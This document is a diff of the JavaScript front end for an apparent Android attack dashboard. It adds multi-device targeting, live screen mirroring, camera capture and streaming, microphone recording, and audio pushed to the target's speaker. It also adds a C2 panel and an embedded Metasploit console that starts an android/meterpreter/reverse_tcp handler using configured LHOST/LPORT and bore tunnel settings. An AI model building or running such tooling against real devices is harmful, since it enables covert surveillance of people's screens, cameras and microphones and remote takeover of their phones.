+                      '#44ff99','#66ddff','#ffdd66','#cc88ff','#66aaff'];
 let settings   = {lhost:"",lport:"4444",bore_server:"bore.pub",nvd_api_key:"",c2_host:"",c2_port:"8889"};
 
 // ── Init ──────────────────────────────────────────────────────────────────────
 window.onload = () => {
   buildSidebar();
-  refreshDevices();
+  startDeviceWatch();
   connectSSE();
   loadSettings();
   detectLhost();
@@ -1004,7 +2082,9 @@ function selectOp(op, el) {
   document.querySelectorAll('.op-item').forEach(e => e.classList.remove('active'));
   el.classList.add('active');
   currentOp = op;
-  renderParams(op);
+  const panel = document.getElementById('params-panel');
+  panel.classList.add('switching');
+  setTimeout(() => { renderParams(op); panel.classList.remove('switching'); }, 80);
 }
 
 // ── Params ────────────────────────────────────────────────────────────────────
@@ -1013,6 +2093,39 @@ function renderParams(op) {
   document.getElementById('op-desc').textContent = op.desc;
   const form = document.getElementById('params-form');
   form.innerHTML = '';
+
+  // ── device target row (always present for every operation) ─────
+  const devWrap = mkField('Target Device');
+  const devSel  = document.createElement('select');
+  devSel.id    = 'f_device_target';
+  devSel.style.cssText = 'min-width:220px;';
+  // populate from _deviceMap
+  const allOpt = document.createElement('option');
+  allOpt.value = '__all__'; allOpt.textContent = '★ All connected devices';
+  devSel.appendChild(allOpt);
+  const noneOpt = document.createElement('option');
+  noneOpt.value = ''; noneOpt.textContent = '-- none (auto) --';
+  devSel.appendChild(noneOpt);
+  for (const [serial, dev] of Object.entries(_deviceMap)) {
+    const o = document.createElement('option');
+    o.value = serial;
+    o.textContent = (dev.label || serial) + (dev.android ? ' · Android '+dev.android : '');
+    devSel.appendChild(o);
+  }
+  // sync with sidebar selection by default
+  const sidebarSel = document.getElementById('dev-select').value;
+  devSel.value = sidebarSel || '';
+  // keep sidebar in sync when changed here
+  devSel.onchange = () => {
+    const v = devSel.value;
+    if (v !== '__all__') {
+      document.getElementById('dev-select').value = v;
+      if (v && _deviceMap[v]) _updateDevBadge(_deviceMap[v]);
+      else { document.getElementById('devbadge').classList.remove('connected'); }
+    }
+  };
+  devWrap.appendChild(devSel);
+  form.appendChild(devWrap);
 
   for (const f of (op.fields || [])) {
     // use app dropdown if apps loaded and field is 'package'
@@ -1042,6 +2155,7 @@ function renderParams(op) {
     } else {
       const i = document.createElement('input');
       i.id = 'f_' + f.n; i.name = f.n; i.type = 'text';
+      i.dataset.name = f.n; i.className = 'param-field';
       // pre-fill from global settings where applicable
       const settingsMap = {lhost:'lhost',lport:'lport',bore_server:'bore_server',
                            nvd_api_key:'nvd_api_key',c2_host:'c2_host',c2_port:'c2_port'};
@@ -1053,9 +2167,14 @@ function renderParams(op) {
   }
 
   const btn = document.createElement('button');
-  btn.id = 'run-btn'; btn.textContent = '▶ RUN';
+  btn.id = 'run-btn';
+  btn.textContent = '▶ ' + (op.runLabel || 'RUN');
   btn.onclick = runOp;
   form.appendChild(btn);
+
+  // show process sniffer panel if op has it
+  showProcSniff(!!op.hasProcSniff);
+  if (op.hasProcSniff) refreshProcs();
 }
 
 function mkField(label) {
@@ -1067,33 +2186,60 @@ function mkField(label) {
 // ── Run ───────────────────────────────────────────────────────────────────────
 function runOp() {
   if (!currentOp) return;
-  const serial = document.getElementById('dev-select').value;
+
+  const devTargetEl = document.getElementById('f_device_target');
+  const devTarget   = devTargetEl ? devTargetEl.value : document.getElementById('dev-select').value;
+  const allDevices  = devTarget === '__all__';
+
   const params = { operation: currentOp.id };
-  if (serial) params.device = serial;
-  // global settings fallbacks
-  if (settings.lhost)      params._lhost_default    = settings.lhost;
-  if (settings.bore_server) params._bore_default    = settings.bore_server;
-  if (settings.nvd_api_key) params.nvd_api_key      = settings.nvd_api_key;
-  for (const f of (currentOp.fields || [])) {
-    const el = document.getElementById('f_' + f.n);
-    if (el && el.value.trim()) params[f.n] = el.value.trim();
+
+  if (allDevices) {
+    params.operation     = 'multi_device';
+    params.sub_operation = currentOp.id;
+    for (const f of (currentOp.fields || [])) {
+      const el = document.getElementById('f_' + f.n);
+      if (el && el.value.trim()) params[f.n] = el.value.trim();
+    }
+  } else {
+    const serial = devTarget || document.getElementById('dev-select').value;
+    if (serial) { params.device = serial; document.getElementById('dev-select').value = serial; }
+    if (settings.lhost)       params._lhost_default  = settings.lhost;
+    if (settings.bore_server) params._bore_default   = settings.bore_server;
+    if (settings.nvd_api_key) params.nvd_api_key     = settings.nvd_api_key;
+    for (const f of (currentOp.fields || [])) {
+      const el = document.getElementById('f_' + f.n);
+      if (el && el.value.trim()) params[f.n] = el.value.trim();
+    }
+    if (!params.lhost   && settings.lhost)   params.lhost   = settings.lhost;
+    if (!params.lport   && settings.lport)   params.lport   = settings.lport;
+    if (!params.c2_host && settings.c2_host) params.c2_host = settings.c2_host;
+    if (!params.c2_port && settings.c2_port) params.c2_port = settings.c2_port;
+    delete params._lhost_default; delete params._bore_default;
   }
-  // apply lhost/lport from settings if not explicitly set
-  if (!params.lhost && settings.lhost)   params.lhost = settings.lhost;
-  if (!params.lport && settings.lport)   params.lport = settings.lport;
-  if (!params.c2_host && settings.c2_host) params.c2_host = settings.c2_host;
-  if (!params.c2_port && settings.c2_port) params.c2_port = settings.c2_port;
-  // clean internal keys
-  delete params._lhost_default; delete params._bore_default;
-  const context = { target: serial || 'device', params };
+
+  const label   = allDevices
+    ? `${currentOp.label} [ALL ${Object.keys(_deviceMap).length} devices]`
+    : currentOp.label;
+  const context = { target: allDevices ? 'all' : (params.device || 'device'), params };
+
   switchTab('terminal');
-  termLine(`\x1b[36m[*] Launching: ${currentOp.label}\x1b[0m`);
-  opStartTs = Date.now();
   fetch('/api/run', {
     method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify(context)
   }).then(r => r.json()).then(d => {
-    if (!d.ok) termLine(`\x1b[31m[!] ${d.error}\x1b[0m`);
+    if (d.ok) {
+      const sid   = d.session_id;
+      const color = _sessionColors[(sid-1) % _sessionColors.length];
+      _activeSessions[sid] = {
+        id: sid, op: params.operation, device: params.device || '',
+        status: 'running', startTs: Date.now(), color
+      };
+      opStartTs = opStartTs || Date.now();
+      updateSessionsBar();
+      termLine(`\x1b[36m[*] Session #${sid} started: ${label}\x1b[0m`);
+    } else {
+      termLine(`\x1b[31m[!] ${d.error}\x1b[0m`);
+    }
   });
 }
 
@@ -1103,8 +2249,23 @@ function connectSSE() {
   es = new EventSource('/api/stream');
   es.onmessage = (e) => {
     const line = e.data;
+    // detect session-done sentinel
+    const doneMatch = line.match(/^\x1b\[35m\[done:(\d+)\]\x1b\[0m$/) ||
+                      line.match(/^\[done:(\d+)\]$/);
+    if (doneMatch) {
+      const sid = parseInt(doneMatch[1]);
+      if (_activeSessions[sid]) {
+        const s = _activeSessions[sid];
+        s.status = 'done';
+        updateSessionsBar();
+        showToast(`Session #${sid} (${s.op}) complete`, 'info', 3000);
+        // cleanup done sessions after 8s
+        setTimeout(() => { delete _activeSessions[sid]; updateSessionsBar(); }, 8000);
+      }
+      termLine(line); return;
+    }
     termLine(line);
-    if (line === '[qr-captured]' || line.includes('[qr-url-captured]')) {
+    if (line.includes('[qr-captured]') || line.includes('[qr-url-captured]')) {
       setTimeout(loadQR, 500);
     }
     tryParseFindings(line);
@@ -1299,7 +2460,7 @@ function loadDeps() {
 
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(tab) {
-  const names = ['terminal','adb','findings','qr','files','setup','c2'];
+  const names = ['terminal','adb','findings','qr','files','setup','c2','live'];
   document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', names[i]===tab));
   document.getElementById('terminal-wrap').style.display  = tab==='terminal' ? 'flex':'none';
   document.getElementById('adb-console').style.display    = tab==='adb'      ? 'flex':'none';
@@ -1308,10 +2469,12 @@ function switchTab(tab) {
   document.getElementById('files-panel').style.display    = tab==='files'    ? 'flex':'none';
   document.getElementById('setup-panel').style.display    = tab==='setup'    ? 'flex':'none';
   document.getElementById('c2-panel').style.display       = tab==='c2'       ? 'flex':'none';
+  document.getElementById('live-panel').style.display     = tab==='live'     ? 'flex':'none';
   if (tab === 'qr')     { loadQR(); }
   if (tab === 'files')  { loadFiles(); }
   if (tab === 'setup')  { loadDeps(); }
   if (tab === 'c2')     { checkC2Status(); }
+  if (tab === 'live')   { onLiveTabOpen(); }
 }
 
 // ── ADB Console ───────────────────────────────────────────────────────────────
@@ -1335,39 +2498,183 @@ function adbPrint(line) {
 }
 
 // ── Devices ───────────────────────────────────────────────────────────────────
-function refreshDevices() {
+let _knownSerials  = new Set();   // track connected serials across polls
+let _deviceMap     = {};          // serial → device info object
+let _deviceWatchId = null;
+
+function startDeviceWatch() {
+  pollDevices();                               // immediate first poll
+  _deviceWatchId = setInterval(pollDevices, 2000);
+}
+
+function pollDevices() {
   fetch('/api/devices').then(r => r.json()).then(d => {
-    const sel = document.getElementById('dev-select');
-    const cur = sel.value;
-    sel.innerHTML = '<option value="">-- device --</option>';
-    for (const dev of d.devices) {
-      const o = document.createElement('option');
-      o.value = dev.serial;
-      o.textContent = dev.serial + (dev.tags ? ' ('+dev.tags+')' : '');
-      if (dev.serial === cur) o.selected = true;
-      sel.appendChild(o);
+    _applyDeviceList(d.devices || []);
+  }).catch(() => {});
+}
+
+// ── shared device-list applier (used by poll + force reload) ──────────────────
+function _applyDeviceList(devs) {
+  const newMap = {};
+  devs.forEach(dev => { newMap[dev.serial] = dev; });
+  const newSet = new Set(Object.keys(newMap));
+  const sel    = document.getElementById('dev-select');
+  const curSel = sel.value;
+
+  // ── detect connects ────────────────────────────────────────────
+  for (const serial of newSet) {
+    if (!_knownSerials.has(serial)) {
+      const dev   = newMap[serial];
+      const label = dev.label || serial;
+      if (dev.status === 'unauthorized') {
+        termLine(`\x1b[33m[!] Device detected but unauthorized: ${serial} — accept USB debugging on device\x1b[0m`);
+        showToast(`Tap "Allow" on ${serial} to authorize USB`, 'info', 6000);
+      } else {
+        const aVer  = dev.android ? ` Android ${dev.android}` : '';
+        termLine(`\x1b[32m[+] Device connected: ${label}${aVer} (${serial})\x1b[0m`);
+        showToast(`Connected: ${label}${aVer}`, 'connect', 4000);
+        if (!curSel) {
+          sel.value = serial;
+          _updateDevBadge(dev);
+          appList = [];
+          if (currentOp) renderParams(currentOp);
+        }
+      }
     }
-    if (!cur && d.devices.length === 1) {
-      sel.value = d.devices[0].serial;
-      loadDevInfo(d.devices[0].serial);
+  }
+
+  // ── detect disconnects ─────────────────────────────────────────
+  for (const serial of _knownSerials) {
+    if (!newSet.has(serial)) {
+      const label = (_deviceMap[serial] && _deviceMap[serial].label) || serial;
+      termLine(`\x1b[31m[!] Device disconnected: ${label} (${serial})\x1b[0m`);
+      showToast(`Disconnected: ${label}`, 'disconnect', 4000);
+      if (curSel === serial) {
+        document.getElementById('dev-name').textContent = 'no device';
+        document.getElementById('dev-os').textContent   = '';
+        document.getElementById('devbadge').classList.remove('connected');
+        const remaining = devs.filter(x => x.serial !== serial);
+        if (remaining.length) {
+          sel.value = remaining[0].serial;
+          _updateDevBadge(remaining[0]);
+        } else {
+          sel.value = '';
+        }
+      }
     }
+  }
+
+  // ── rebuild dropdown (virtualised — handles unlimited devices) ─
+  _knownSerials = newSet;
+  _deviceMap    = newMap;
+  const prevSel = sel.value;
+
+  // Use a DocumentFragment for O(n) DOM insertion regardless of device count
+  const frag = document.createDocumentFragment();
+  const placeholder = document.createElement('option');
+  placeholder.value = ''; placeholder.textContent = '-- device --';
+  frag.appendChild(placeholder);
+
+  for (const dev of devs) {
+    const o = document.createElement('option');
+    o.value = dev.serial;
+    if (dev.status === 'unauthorized') {
+      o.textContent = `⚠ ${dev.serial} — tap Allow on device`;
+      o.disabled    = true;
+      o.style.color = '#e67828';
+    } else {
+      o.textContent = (dev.label || dev.serial) +
+        (dev.android ? ' · Android '+dev.android : '') +
+        (dev.sdk     ? ' (SDK '+dev.sdk+')'       : '');
+    }
+    if (dev.serial === prevSel) o.selected = true;
+    frag.appendChild(o);
+  }
+  sel.innerHTML = '';
+  sel.appendChild(frag);
+
+  // ── update device count badge ──────────────────────────────────
+  const cnt = devs.length;
+  const cntEl = document.getElementById('dev-count');
+  if (cntEl) cntEl.textContent = cnt ? `${cnt} device${cnt>1?'s':''}` : '';
+
+  // ── sync badge ─────────────────────────────────────────────────
+  if (prevSel && newMap[prevSel]) {
+    _updateDevBadge(newMap[prevSel]);
+  } else if (!prevSel || !newMap[prevSel]) {
+    document.getElementById('devbadge').classList.remove('connected');
+  }
+}
+
+function _updateDevBadge(dev) {
+  const name = dev.label || dev.serial;
+  const os   = dev.android
+    ? 'Android ' + dev.android + (dev.sdk ? ' (SDK '+dev.sdk+')' : '')
+    : (dev.tags || '');
+  document.getElementById('dev-name').textContent = name;
+  document.getElementById('dev-os').textContent   = os;
+  document.getElementById('devbadge').classList.add('connected');
+}
+
+function refreshDevices() {
+  // manual refresh: clear known state and re-poll immediately
+  _knownSerials = new Set();
+  _deviceMap    = {};
+  pollDevices();
+}
+
+function forceReloadADB() {
+  const btn = document.getElementById('reload-btn');
+  btn.textContent = '… restarting';
+  btn.disabled    = true;
+  fetch('/api/devices/reload').then(r => r.json()).then(d => {
+    btn.textContent = '⚡ reload adb';
+    btn.disabled    = false;
+    _knownSerials   = new Set();
+    _deviceMap      = {};
+    // process the fresh device list returned by reload
+    _applyDeviceList(d.devices || []);
+    termLine('\x1b[36m[i] ADB server restarted — device list refreshed\x1b[0m');
+  }).catch(() => {
+    btn.textContent = '⚡ reload adb';
+    btn.disabled    = false;
+    termLine('\x1b[31m[!] ADB reload failed\x1b[0m');
   });
 }
 
 function onDeviceChange() {
   const serial = document.getElementById('dev-select').value;
-  if (serial) loadDevInfo(serial);
+  if (serial && _deviceMap[serial]) {
+    _updateDevBadge(_deviceMap[serial]);
+  } else if (serial) {
+    // fallback: fetch devinfo if not in cache
+    fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
+      const dev = {
+        serial,
+        label:   (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial),
+        android: d['ro.build.version.release']||'',
+        sdk:     d['ro.build.version.sdk']||'',
+      };
+      _updateDevBadge(dev);
+    });
+  } else {
+    document.getElementById('dev-name').textContent = 'no device';
+    document.getElementById('dev-os').textContent   = '';
+    document.getElementById('devbadge').classList.remove('connected');
+  }
   appList = [];
   if (currentOp) renderParams(currentOp);
 }
 
 function loadDevInfo(serial) {
+  if (_deviceMap[serial]) { _updateDevBadge(_deviceMap[serial]); return; }
   fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
     document.getElementById('dev-name').textContent =
       (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial);
     document.getElementById('dev-os').textContent =
       'Android '+(d['ro.build.version.release']||'?')+
       ' (SDK '+(d['ro.build.version.sdk']||'?')+')';
+    document.getElementById('devbadge').classList.add('connected');
   });
 }
 
@@ -1409,7 +2716,7 @@ function showC2Frame(url) {
 function launchC2() {
   const port = getC2Port();
   const badge = document.getElementById('c2-status-badge');
-  badge.textContent = '… starting'; badge.style.color = 'var(--yellow)';
+  badge.textContent = '… starting'; badge.style.color = 'var(--grey)';
   fetch('/api/c2/launch?port='+port).then(r => r.json()).then(d => {
     if (d.ok) {
       showC2Frame(d.url);
@@ -1433,39 +2740,496 @@ function stopC2() {
   });
 }
 
+// ── Toast ─────────────────────────────────────────────────────────────────────
+function showToast(msg, type='info', ms=3200) {
+  const c = document.getElementById('toast-container');
+  if (!c) return;
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  t.textContent = msg;
+  c.appendChild(t);
+  setTimeout(() => {
+    t.style.animation = 'toastOut .25s ease both';
+    setTimeout(() => t.remove(), 260);
+  }, ms);
+}
+
 // ── Status ────────────────────────────────────────────────────────────────────
 function updateStatus() {
-  fetch('/api/status').then(r => r.json()).then(d => {
-    const dot  = document.getElementById('status-dot');
-    const txt  = document.getElementById('status-text');
-    const kill = document.getElementById('kill-btn');
-    if (d.running) {
-      dot.className = 'active';
-      txt.textContent = 'running: ' + d.op + (d.pid ? ' [pid '+d.pid+']' : '');
-      kill.classList.add('active');
-      const rb = document.getElementById('run-btn');
-      if (rb) rb.disabled = true;
+  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
+  const dot  = document.getElementById('status-dot');
+  const txt  = document.getElementById('status-text');
+  const kill = document.getElementById('kill-btn');
+  const pb   = document.getElementById('progress-bar');
+  if (running.length > 0) {
+    dot.className = 'active';
+    if (running.length === 1) {
+      const s = running[0];
+      txt.textContent = 'running: ' + s.op + (s.device ? ' ['+s.device+']' : '');
     } else {
-      dot.className = '';
-      txt.textContent = 'idle';
-      kill.classList.remove('active');
-      const rb = document.getElementById('run-btn');
-      if (rb) rb.disabled = false;
-      opStartTs = null;
+      txt.textContent = running.length + ' running: ' + running.map(s=>s.op).join(', ');
+    }
+    kill.classList.add('active');
+    if (pb) pb.classList.add('active');
+  } else {
+    dot.className = '';
+    txt.textContent = 'idle';
+    kill.classList.remove('active');
+    if (pb) pb.classList.remove('active');
+    opStartTs = null;
+  }
+}
+
+function updateStatusTime() {
+  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
+  const el = document.getElementById('status-time');
+  if (running.length === 0) { el.textContent = ''; return; }
+  const oldest = Math.min(...running.map(s => s.startTs));
+  el.textContent = Math.floor((Date.now() - oldest) / 1000) + 's';
+}
+
+function killOp(sid) {
+  const url = sid ? '/api/kill?session=' + sid : '/api/kill';
+  fetch(url, {method:'POST'});
+}
+
+function updateSessionsBar() {
+  const bar   = document.getElementById('sessions-bar');
+  const label = document.getElementById('sess-label');
+  const cnt   = document.getElementById('sess-count');
+  const all   = Object.values(_activeSessions);
+  if (all.length === 0) { bar.classList.remove('visible'); return; }
+  bar.classList.add('visible');
+  const running = all.filter(s => s.status === 'running');
+  if (cnt) cnt.textContent = running.length ? running.length + ' running' : 'all done';
+
+  // rebuild pills — preserve existing ones by sid to avoid flicker
+  const existing = new Set([...bar.querySelectorAll('.sess-pill')].map(el => +el.dataset.sid));
+  const current  = new Set(all.map(s => s.id));
+
+  // remove stale pills
+  bar.querySelectorAll('.sess-pill').forEach(el => {
+    if (!current.has(+el.dataset.sid)) el.remove();
+  });
+
+  // add/update
+  const frag = document.createDocumentFragment();
+  all.forEach(s => {
+    let pill = bar.querySelector('.sess-pill[data-sid="'+s.id+'"]');
+    const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
+    if (!pill) {
+      pill = document.createElement('div');
+      pill.className = 'sess-pill ' + s.status;
+      pill.dataset.sid = s.id;
+      pill.innerHTML =
+        '<span class="sp-dot" style="background:'+s.color+'"></span>' +
+        '<span class="sp-label">#'+s.id+' '+s.op+'</span>' +
+        (s.device ? '<span class="sp-dev">'+s.device+'</span>' : '') +
+        '<span class="sp-time">'+elapsed+'s</span>' +
+        '<span class="sp-kill" title="kill" onclick="killOp('+s.id+')">×</span>';
+      if (s.status === 'running') pill.querySelector('.sp-dot').classList.add('running');
+      frag.appendChild(pill);
+    } else {
+      pill.className = 'sess-pill ' + s.status;
+      const dot = pill.querySelector('.sp-dot');
+      if (dot) {
+        dot.style.background = s.color;
+        dot.classList.toggle('running', s.status === 'running');
+      }
+      const timeEl = pill.querySelector('.sp-time');
+      if (timeEl) timeEl.textContent = elapsed + 's';
+    }
+  });
+  bar.appendChild(frag);
+}
+
+// ── Live Media ────────────────────────────────────────────────────────────────
+let _screenActive  = false;
+let _screenFpsTs   = 0;
+let _screenFpsCnt  = 0;
+let _micActive     = false;
+let _micPollTimer  = null;
+let _msfEs         = null;
+let _speakerFile   = null;
+
+function onLiveTabOpen() {
+  const serial = document.getElementById('dev-select').value;
+  // populate cam select from device map
+  if (_deviceMap[serial]) {
+    const cam = document.getElementById('cam-id');
+    // basic: ensure two options always present
+    if (cam.options.length < 2) {
+      cam.add(new Option('Camera 1 (front)', '1'));
+    }
+  }
+  checkMsfStatus();
+}
+
+// ── Screen ────────────────────────────────────────────────────────────────────
+function _screenSerial() {
+  return document.getElementById('dev-select').value || '';
+}
+
+function startScreen() {
+  if (_screenActive) return;
+  _screenActive = true;
+  _screenFpsCnt = 0;
+  const serial  = _screenSerial();
+  const img     = document.getElementById('screen-img');
+  const ph      = document.getElementById('screen-placeholder');
+  const dot     = document.getElementById('screen-dot');
+  const stopBtn = document.getElementById('screen-stop-btn');
+  const overlay = document.getElementById('screen-overlay');
+
+  img.src = '/api/media/screen' + (serial ? '?serial=' + encodeURIComponent(serial) : '');
+  img.style.display = 'block'; ph.style.display = 'none';
+  overlay.style.display = 'block';
+  dot.classList.add('on');
+  stopBtn.style.display = '';
+  document.querySelector('#live-panel .live-section .live-btn.go').style.display = 'none';
+
+  // FPS counter via load events
+  img.onload = () => {
+    _screenFpsCnt++;
+    const now = Date.now();
+    if (now - _screenFpsTs >= 1000) {
+      const fps = (_screenFpsCnt / ((now - _screenFpsTs) / 1000)).toFixed(1);
+      document.getElementById('screen-fps').textContent = fps + ' fps';
+      _screenFpsCnt = 0; _screenFpsTs = now;
+    }
+  };
+  img.onerror = () => {
+    stopScreen();
+    showToast('Screen stream error — is device authorized?', 'disconnect', 4000);
+  };
+  document.getElementById('live-badge').style.display = 'inline';
+  showToast('Screen mirror started', 'connect', 2000);
+}
+
+function stopScreen() {
+  _screenActive = false;
+  const img     = document.getElementById('screen-img');
+  img.src       = ''; img.style.display = 'none';
+  document.getElementById('screen-placeholder').style.display = '';
+  document.getElementById('screen-overlay').style.display     = 'none';
+  document.getElementById('screen-dot').classList.remove('on');
+  document.getElementById('screen-stop-btn').style.display    = 'none';
+  document.querySelector('#live-panel .live-section .live-btn.go').style.display = '';
+  document.getElementById('screen-fps').textContent           = '';
+  document.getElementById('live-badge').style.display         = 'none';
+}
+
+function snapScreen() {
+  const serial = _screenSerial();
+  const url = '/api/media/screen/snap' + (serial ? '?serial='+encodeURIComponent(serial) : '');
+  const a = document.createElement('a');
+  a.href = url; a.download = 'screen_' + Date.now() + '.png';
+  a.click();
+}
+
+// ── Camera ────────────────────────────────────────────────────────────────────
+function camSnap() {
+  const serial = _screenSerial();
+  const camId  = document.getElementById('cam-id').value;
+  const url    = '/api/media/camera/snap?serial=' + encodeURIComponent(serial) + '&id=' + camId;
+  const img    = document.getElementById('camera-img');
+  const ph     = document.getElementById('camera-placeholder');
+  img.onload   = () => { img.style.display = 'block'; ph.style.display = 'none'; };
+  img.onerror  = () => showToast('Camera snap failed — try via Meterpreter webcam_snap', 'disconnect', 4000);
+  img.src      = url + '&_t=' + Date.now();
+}
+
+function startCamStream() {
+  const port = document.getElementById('cam-port').value || '8880';
+  const img  = document.getElementById('camera-img');
+  const ph   = document.getElementById('camera-placeholder');
+  img.src    = '/api/media/camera/stream?port=' + port + '&_t=' + Date.now();
+  img.style.display = 'block'; ph.style.display = 'none';
+  document.getElementById('cam-dot').classList.add('on');
+  img.onerror = () => {
+    img.style.display = 'none'; ph.style.display = '';
+    document.getElementById('cam-dot').classList.remove('on');
+    showToast('Camera stream failed — run webcam_stream in MSF first', 'disconnect', 5000);
+  };
+  showToast('Camera stream started (proxied from port ' + port + ')', 'connect', 2500);
+}
+
+// ── Microphone ────────────────────────────────────────────────────────────────
+function toggleMic() {
+  if (_micActive) stopMicRecord();
+  else startMicRecord();
+}
+
+function startMicRecord() {
+  _micActive = true;
+  const btn    = document.getElementById('mic-btn');
+  const serial = _screenSerial();
+  const dur    = document.getElementById('mic-dur').value;
+  btn.textContent = '■ Stop'; btn.classList.add('active');
+  document.getElementById('audio-dot').classList.add('on');
+  document.getElementById('mic-status').textContent = 'Recording…';
+  fetch('/api/media/mic/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device: serial, duration: parseInt(dur)})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      _micPollTimer = setInterval(pollMicChunk, (parseInt(dur) + 1) * 1000);
+    } else {
+      showToast('Mic start failed: ' + (d.error||''), 'disconnect', 4000);
+      stopMicRecord();
     }
   });
 }
 
-function updateStatusTime() {
-  if (opStartTs) {
-    const s = Math.floor((Date.now()-opStartTs)/1000);
-    document.getElementById('status-time').textContent = s+'s';
-  } else {
-    document.getElementById('status-time').textContent = '';
+function stopMicRecord() {
+  _micActive = false;
+  clearInterval(_micPollTimer); _micPollTimer = null;
+  document.getElementById('mic-btn').textContent = '▶ Record';
+  document.getElementById('mic-btn').classList.remove('active');
+  document.getElementById('audio-dot').classList.remove('on');
+  document.getElementById('mic-status').textContent = 'Stopped';
+  fetch('/api/media/mic/stop', {method:'POST'});
+}
+
+function pollMicChunk() {
+  fetch('/api/media/mic/chunk').then(r => {
+    if (!r.ok) return;
+    return r.blob();
+  }).then(blob => {
+    if (!blob) return;
+    const url   = URL.createObjectURL(blob);
+    const audio = document.getElementById('mic-audio');
+    audio.src   = url; audio.style.display = 'block';
+    const ts    = new Date().toLocaleTimeString();
+    document.getElementById('mic-status').textContent = 'Last chunk: ' + ts;
+    // animate mic bars
+    _animateMicBars();
+  }).catch(()=>{});
+}
+
+function _animateMicBars() {
+  const viz = document.getElementById('mic-visualizer');
+  viz.innerHTML = '';
+  for (let i=0;i<24;i++) {
+    const b = document.createElement('div');
+    b.className = 'mic-bar';
+    b.style.height = Math.floor(Math.random()*22+4)+'px';
+    viz.appendChild(b);
+  }
+  setTimeout(() => { viz.innerHTML = ''; }, 800);
+}
+
+// ── Speaker ───────────────────────────────────────────────────────────────────
+let _speakerB64 = '';
+
+function speakerFileChosen(input) {
+  const file = input.files[0];
+  if (!file) return;
+  _speakerFile = file;
+  document.getElementById('spk-label').textContent = file.name;
+  document.getElementById('spk-status').textContent = 'Ready: ' + file.name;
+  const reader = new FileReader();
+  reader.onload = e => {
+    _speakerB64 = e.target.result.split(',')[1];
+  };
+  reader.readAsDataURL(file);
+}
+
+function pushSpeaker() {
+  if (!_speakerB64) { showToast('Select an audio file first', 'info', 2500); return; }
+  const ext    = (_speakerFile.name.split('.').pop() || 'mp3').toLowerCase();
+  const serial = _screenSerial();
+  document.getElementById('spk-status').textContent = 'Pushing to device…';
+  fetch('/api/media/speaker', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device: serial, data: _speakerB64, ext})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      document.getElementById('spk-status').textContent = 'Playing: ' + d.path;
+      showToast('Audio pushed and playing on device', 'connect', 3000);
+    } else {
+      document.getElementById('spk-status').textContent = 'Error: ' + (d.error||'failed');
+      showToast('Speaker push failed: ' + (d.error||''), 'disconnect', 4000);
+    }
+  });
+}
+
+// ── MSF Meterpreter Console ───────────────────────────────────────────────────
+function startMsf() {
+  const serial = _screenSerial();
+  const lhost  = (settings.lhost || '');
+  const lport  = (settings.lport || '4444');
+  const init   = lhost
+    ? `use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; run -j`
+    : '';
+  fetch('/api/msf/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({init})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      connectMsfSSE();
+      setMsfStatus(true);
+      showToast('msfconsole started', 'connect', 2500);
+    } else {
+      showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
+    }
+  });
+}
+
+function stopMsf() {
+  fetch('/api/msf/stop', {method:'POST'}).then(()=>{
+    setMsfStatus(false);
+    if (_msfEs) { _msfEs.close(); _msfEs = null; }
+    showToast('msfconsole stopped', 'info', 2000);
+  });
+}
+
+function checkMsfStatus() {
+  fetch('/api/msf/sessions').then(r=>r.json()).then(d=>{
+    setMsfStatus(d.running);
+    if (d.running && !_msfEs) connectMsfSSE();
+  }).catch(()=>{});
+}
+
+function setMsfStatus(on) {
+  const el = document.getElementById('msf-status');
+  const dot = document.getElementById('msf-dot');
+  el.textContent = on ? 'running' : 'offline';
+  el.className   = on ? 'on' : '';
+  if (on) dot.classList.add('on'); else dot.classList.remove('on');
+}
+
+function connectMsfSSE() {
+  if (_msfEs) _msfEs.close();
+  _msfEs = new EventSource('/api/msf/stream');
+  _msfEs.onmessage = (e) => msfLine(e.data);
+  _msfEs.onerror   = () => setTimeout(() => {
+    if (_msfEs) { _msfEs.close(); _msfEs = null; }
+  }, 3000);
+}
+
+function msfLine(raw) {
+  const term = document.getElementById('msf-terminal');
+  const span = document.createElement('span');
+  span.className = 'ln';
+  span.innerHTML = ansiToHtml(raw) + '\n';
+  term.appendChild(span);
+  term.scrollTop = term.scrollHeight;
+  // auto-detect webcam stream port announcement
+  const portMatch = raw.match(/webcam.*?(\d{4,5})/i);
+  if (portMatch) {
+    document.getElementById('cam-port').value = portMatch[1];
+    showToast('Webcam stream on port ' + portMatch[1] + ' — click Camera ▶ Stream', 'info', 5000);
   }
 }
 
-function killOp() { fetch('/api/kill',{method:'POST'}); }
+function msfSend(cmd) {
+  fetch('/api/msf/send', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({cmd})
+  }).then(r => r.json()).then(d => {
+    if (!d.ok) showToast('MSF send failed: ' + (d.error||''), 'disconnect', 3000);
+  });
+  // echo to terminal
+  msfLine('\x1b[36mmsf> ' + cmd + '\x1b[0m');
+}
+
+function msfEnter(e) {
+  if (e.key !== 'Enter') return;
+  const inp = document.getElementById('msf-input');
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  inp.value = '';
+  msfSend(cmd);
+}
+
+// ── Process Sniffer ───────────────────────────────────────────────────────────
+let _procEs         = null;
+let _procFilter     = '';
+let _procList       = [];
+let _procSelected   = null;
+
+function showProcSniff(visible) {
+  const panel = document.getElementById('proc-sniff-panel');
+  if (visible) panel.classList.add('visible');
+  else {
+    panel.classList.remove('visible');
+    stopProcStream();
+  }
